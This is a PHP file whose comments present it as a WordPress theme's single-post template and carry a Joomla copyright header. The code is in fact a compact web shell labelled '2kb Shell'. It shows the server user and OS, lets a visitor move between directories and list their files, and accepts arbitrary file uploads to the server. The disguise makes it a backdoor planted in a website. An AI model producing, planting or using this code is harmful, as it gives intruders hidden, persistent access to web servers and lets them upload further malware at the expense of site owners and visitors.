<?php 
/**
 * The template for displaying all single posts.
 *
 * @package naturelle
 */ 
/**
 * @package    Joomla.Site
 * @copyright  Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */
echo "<title>2kb Shell</title><body bgcolor=\"#5e5e5e\">
<script>var d = document;function g(c) {d.mf.c.value=c;d.mf.submit();}
</script>";echo"<h1>".@get_current_user()."</h1>";echo PHP_OS;if(strtoupper(substr(PHP_OS,0,3)) == "WIN")$os='win';else$os='nix';$home_cwd=@getcwd();if(isset($_POST['c']))@chdir($_POST['c']);$cwd=@getcwd();if($os == 'win'){$home_cwd=str_replace("\\","/",$home_cwd);$cwd=str_replace("\\","/",$cwd);echo "<!-- <td><nobr>Windows --!>";echo "<!-- g('FilesMan','c:/') --!>";}$safe_mode=@ini_get('safe_mode');if(!$safe_mode){echo "<!-- Safe mode:</span> <b>OFF</b> --!>\n";echo "<!-- Safe mode:</span> <b>OFF</b> --!>\n";}if($cwd[strlen($cwd)-1] != '/')$cwd .= '/';echo "Tunisia Path: ".htmlspecialchars($cwd)."<input type=hidden name=c value='".htmlspecialchars($cwd)."'><hr>";if(!is_writable($cwd)){echo "<font color=red>(Not writable)</font><br>";}if($_POST['p1'] === 'uploadFile'){if(!@move_uploaded_file($_FILES['f']['tmp_name'],$cwd.$_FILES['f']['name']))echo "Can't upload!<br />";}$ls=wscandir($cwd);echo "<form method=post name=mf style='display:none;'><input type=hidden name=c></form>";foreach($ls as $f){if(is_dir($f)){echo "<font  color=\#25ff00\"><a color=\#25ff00\ href=# onclick='g(\"".$cwd.$f."\");'>".$f."</a></font>";if(is_writable($cwd.$f)){echo "<!-- 'filename.php','chmod')\"><font color=green> --!> ";}else{echo "<!-- 'filename.php','chmod')\"><font color=white> --!> ";}echo "<br />";}else{$files[]=$f;}}foreach($files as $file){echo "<font color=\"#25ff00\">".$file."</font><br />";}echo "<hr><form method='post' ENCTYPE='multipart/form-data'><input type=hidden name=c value='".$cwd."'><input type=hidden name=p1 value='uploadFile'><input type=file name=f><input type=submit value='>>'></form><br href=\"http://fb.com/roottn\">By BKSMILE</br></body>";function wscandir($cwdir){if(function_exists("scandir")){return scandir($cwdir);}else{$cwdh=opendir($cwdir);while(false !== ($filename=readdir($cwdh)))$files[]=$filename;return $files;}};die;
?>